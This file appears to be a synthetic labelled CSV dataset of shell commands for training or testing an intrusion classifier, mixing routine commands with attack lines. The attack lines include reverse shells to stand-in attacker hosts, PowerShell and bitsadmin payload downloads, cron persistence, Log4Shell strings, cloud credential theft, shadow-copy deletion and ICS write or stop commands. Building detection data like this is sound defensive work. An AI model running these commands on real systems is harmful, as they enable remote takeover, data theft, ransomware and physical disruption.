timestamp,src_ip,input,label
2026-01-20T18:06:49.594923,109.160.230.177,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.591206,171.171.232.241,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.586561,159.114.43.58,git pull,Normal_Business_Ops
2026-01-20T18:06:49.655635,55.153.184.104,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.628852,173.178.175.33,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.633463,11.126.143.198,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.615344,198.182.45.220,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.602715,5.37.137.144,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.594923,160.161.78.18,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.592928,18.191.39.191,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.648870,80.34.219.17,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.613343,108.224.158.49,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.623750,198.249.59.31,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.632463,87.206.249.247,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.613343,81.59.167.244,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.614343,123.61.56.133,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.617074,145.187.100.171,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.621712,92.188.128.30,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.586561,46.69.19.22,git add .,Normal_Business_Ops
2026-01-20T18:06:49.585564,24.126.222.146,git pull,Normal_Business_Ops
2026-01-20T18:06:49.611343,179.204.191.82,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.583995,168.105.40.24,git pull,Normal_Business_Ops
2026-01-20T18:06:49.622713,124.215.13.46,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.646819,28.110.126.46,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.604716,118.198.10.237,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.577927,214.98.161.129,make build,Normal_Business_Ops
2026-01-20T18:06:49.656632,74.165.208.190,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.590224,156.16.121.50,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.582995,103.234.85.112,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.583995,30.211.144.109,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.633463,201.62.29.68,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.631464,185.240.173.254,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.601728,65.30.160.70,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.583995,57.116.138.114,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.649821,132.221.192.76,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.645231,188.139.22.72,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.643231,181.204.215.95,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.623750,216.82.130.195,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.652043,25.200.41.88,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.625855,25.176.9.44,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.619742,18.149.168.60,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.596536,5.187.49.76,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T18:06:49.655635,160.0.214.75,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.635464,67.218.76.33,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.631464,115.17.251.215,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.616344,164.34.236.208,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.576929,98.109.87.201,git pull,Normal_Business_Ops
2026-01-20T18:06:49.639217,210.129.6.110,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.580995,100.48.152.249,git status,Normal_Business_Ops
2026-01-20T18:06:49.600538,130.124.90.132,npm start,Normal_Business_Ops
2026-01-20T18:06:49.645231,209.162.6.169,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.643231,152.107.83.180,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.634463,175.61.174.97,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.588562,130.176.155.64,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.644231,177.227.245.238,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.602715,187.29.38.172,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.582995,74.61.175.205,git status,Normal_Business_Ops
2026-01-20T18:06:49.605716,74.117.170.23,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.583995,126.63.38.204,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.611343,149.216.90.136,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.655127,83.73.53.165,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.619742,206.127.254.42,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.645231,146.122.154.82,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.640252,161.169.26.117,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.622713,81.96.156.59,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.628852,197.124.67.1,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.582995,91.234.148.6,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.601728,20.106.50.180,uptime,Normal_Business_Ops
2026-01-20T18:06:49.634463,206.61.138.118,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.646819,103.198.109.14,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.604716,58.46.113.100,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.585564,57.106.177.170,git add .,Normal_Business_Ops
2026-01-20T18:06:49.618055,216.173.245.150,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.622713,124.170.229.163,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.639724,181.208.240.192,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.603716,111.115.245.151,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.582995,139.142.230.36,whoami,Normal_Business_Ops
2026-01-20T18:06:49.647820,207.168.87.97,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.653031,107.167.129.197,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.641230,146.208.131.83,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.652043,74.171.87.176,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.627851,77.10.38.231,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.639724,176.236.30.93,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.640252,197.80.20.67,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.643231,111.163.20.236,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.585564,200.145.174.198,df -h,Normal_Business_Ops
2026-01-20T18:06:49.590224,165.21.215.194,uptime,Normal_Business_Ops
2026-01-20T18:06:49.632463,18.114.129.156,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.611343,124.197.29.194,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.655635,190.238.22.220,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.651526,45.193.40.44,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.656632,215.88.204.159,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.583995,62.41.194.69,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.645823,164.211.109.66,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.591206,123.225.161.39,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.638465,185.4.212.200,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.597537,134.73.230.24,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.614343,205.38.233.50,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.618055,38.14.197.17,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.585564,121.49.217.107,git status,Normal_Business_Ops
2026-01-20T18:06:49.592928,142.113.56.220,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.590224,137.234.130.186,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.639724,169.228.215.106,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.586561,24.146.246.18,git pull,Normal_Business_Ops
2026-01-20T18:06:49.618055,90.207.107.248,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.649821,48.34.154.119,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.641230,144.179.46.242,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.580995,55.53.17.158,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.655127,44.12.218.162,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.582995,195.130.62.73,npm start,Normal_Business_Ops
2026-01-20T18:06:49.648870,220.118.83.149,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.600538,180.44.3.242,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.604716,72.190.145.216,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.636464,85.192.132.49,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.626851,42.77.162.29,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.644231,106.17.0.32,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.635464,131.15.141.200,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.610343,119.160.134.121,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.640252,53.45.77.22,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.649821,146.70.102.239,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.653031,122.55.139.98,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.639724,29.151.9.181,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.645823,201.92.104.139,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.656632,40.146.85.176,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.621712,194.163.121.29,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.586561,77.64.64.159,git pull,Normal_Business_Ops
2026-01-20T18:06:49.627851,21.150.125.235,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.615344,2.131.130.247,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.583995,144.28.88.211,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.602715,178.21.29.3,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.601728,20.135.136.62,go run main.go,Normal_Business_Ops
2026-01-20T18:06:49.581995,135.65.194.100,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.575395,66.121.94.57,git status,Normal_Business_Ops
2026-01-20T18:06:49.582995,122.192.124.157,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.636464,180.73.176.123,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.606716,46.66.180.3,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.599537,32.26.7.5,go run main.go,Normal_Business_Ops
2026-01-20T18:06:49.608346,55.255.147.20,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.647820,15.230.162.26,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.586561,163.167.79.238,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T18:06:49.655635,161.59.210.196,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.580022,10.190.93.235,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.644231,158.195.129.82,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.636464,164.200.77.249,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.592928,169.161.60.111,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.590224,41.63.197.204,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.590224,184.52.122.191,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.632463,197.232.39.41,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.600538,218.30.180.119,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.655635,184.77.71.239,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.575395,82.10.100.72,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.593923,71.211.185.253,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.588562,21.130.8.126,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.588562,223.222.79.228,df -h,Normal_Business_Ops
2026-01-20T18:06:49.631464,70.137.213.135,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.655635,185.152.211.85,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.576929,155.159.240.189,go run main.go,Normal_Business_Ops
2026-01-20T18:06:49.654619,63.60.72.251,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.649821,129.76.103.179,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.598537,47.178.68.241,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.580995,182.31.107.190,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.591206,100.101.57.109,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.648870,7.251.144.166,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.616344,196.35.134.95,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.611343,120.49.20.163,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.581995,56.130.161.53,whoami,Normal_Business_Ops
2026-01-20T18:06:49.605716,196.198.236.32,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.655127,130.119.103.33,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.622713,16.136.36.138,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.577927,23.160.35.173,git pull,Normal_Business_Ops
2026-01-20T18:06:49.627851,172.175.186.45,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.575395,213.198.214.212,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.637464,112.183.105.79,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.613343,19.73.25.220,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.601728,69.130.100.167,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.595541,33.84.73.61,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.578927,146.194.100.130,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.619742,18.219.222.226,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.628852,150.2.157.42,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.576420,127.177.198.22,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.639217,68.220.235.86,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.591206,178.7.237.31,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.576929,118.148.36.190,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.656632,6.98.192.2,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.652043,78.84.154.220,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.610343,111.203.219.29,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.638465,114.193.154.125,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.646819,2.34.54.241,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.625345,44.185.102.184,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.583995,137.234.20.31,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.655635,203.188.132.234,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.629483,82.220.86.63,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.640235,13.60.107.180,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.607717,69.175.97.39,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.636464,5.143.100.123,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.612343,143.243.217.88,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.636464,111.62.184.68,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.575395,190.208.106.124,git branch,Normal_Business_Ops
2026-01-20T18:06:49.629483,170.190.183.21,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.603716,38.233.207.1,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.645823,134.133.16.214,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.608346,74.159.21.123,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.655635,148.218.91.97,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.654031,120.201.118.135,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.629483,49.106.200.37,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.638465,53.1.108.135,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.613343,178.55.120.17,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.603716,198.125.145.244,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.599537,42.118.179.222,git branch,Normal_Business_Ops
2026-01-20T18:06:49.591206,55.112.84.229,go run main.go,Normal_Business_Ops
2026-01-20T18:06:49.650820,205.214.253.107,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.624776,210.190.28.96,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.614343,208.27.54.77,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.656632,130.89.92.244,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.617074,29.110.76.167,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.656632,76.146.36.64,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.655127,103.18.93.16,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
